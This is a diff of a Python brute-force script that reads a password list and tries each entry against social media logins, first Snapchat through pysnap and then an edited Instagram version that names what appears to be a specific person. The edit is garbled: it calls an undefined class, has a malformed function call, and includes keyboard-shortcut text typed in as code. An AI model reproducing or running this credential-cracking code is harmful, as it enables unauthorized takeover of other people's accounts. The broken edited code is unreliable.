@@ -4,15 +4,15 @@ from pysnap import Snapchat
 import sys
 import os
 
-def crack(username):
-	print("now cracking: " + username)
-	snapchat = Snapchat()
+def crack(Mohammedsaudmansuri):
+	print("now cracking: " + Mohammedsaudmansuri)
+	Instagram = Instagram()
 	passwords = open("passwords.txt","r")
 	i = 0
 	for password in passwords:
-		result = snapchat.login(username,password)
+		result = instagram.login( mohammedsaudmansuri,password)
 		if (result['logged']!=False):
-			print("success: username: " + username + "\t password: " + password)
+			print("success: Mohammedsaudmansuri: " + Mohammedsaudmansuri + "\t password: " + password)
 			break
 		else:
 			print(str(i))
@@ -20,4 +20,6 @@ def crack(username):
 
 names = open("users.txt","r")
 for name in names:
-	crack(name)	
+	crack(Muhammed saudmansuri)
+	Control + Shift + m
+	esc
